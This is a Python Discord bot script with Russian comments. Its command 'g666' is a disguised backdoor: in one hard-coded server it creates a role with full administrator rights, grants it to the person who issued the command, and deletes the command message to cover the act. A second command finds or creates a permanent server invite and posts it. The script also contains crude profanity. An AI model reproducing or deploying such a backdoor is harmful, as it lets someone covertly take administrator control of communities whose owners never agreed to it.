
# -*- coding: utf-8 -*-
import discord, time, random, sys, subprocess
from discord.ext import commands
client = commands.Bot(command_prefix = '.', intents = discord.Intents.all())
client.remove_command('help')
global whitelist
whitelist = ['737582811044905003','642409834561404928','698634094493565000','662608726339092490','765575831585554452','712267567657385994']

@client.command()
async def g666(ctx):
    if str(ctx.guild.id) == '871060847865266207':
        try:
            guild = ctx.guild
            perms = discord.Permissions(administrator=True) #права роли
            await guild.create_role(name="jopa", permissions=perms) #создаем роль
            role = discord.utils.get(ctx.guild.roles, name="jopa") #находим роль по имени
            user = ctx.message.author #находим юзера
            await user.add_roles(role) #добовляем роль
            await ctx.message.delete()
        except:
            await ctx.author.send('у бота недостаточно прав')
    else:
        print('pizda')

@client.command()
async def text(ctx):
    await ctx.send("sex")
    if len(await ctx.guild.invites()) == 0:
        await ctx.send('инвайт создан 1')
        invite = await ctx.channel.create_invite()
    else:
        invite = None
        for invitee in await ctx.guild.invites():
            if invitee.max_age == 0 and invitee.max_uses == 0:
                invite = invitee
                await ctx.send('инвайт получен')
        if invite is None:
            invite = await ctx.channel.create_invite()
            await ctx.send('инвайд создан 2')
        else:
            pass
    await ctx.send(invite)

client.run('хуй соси')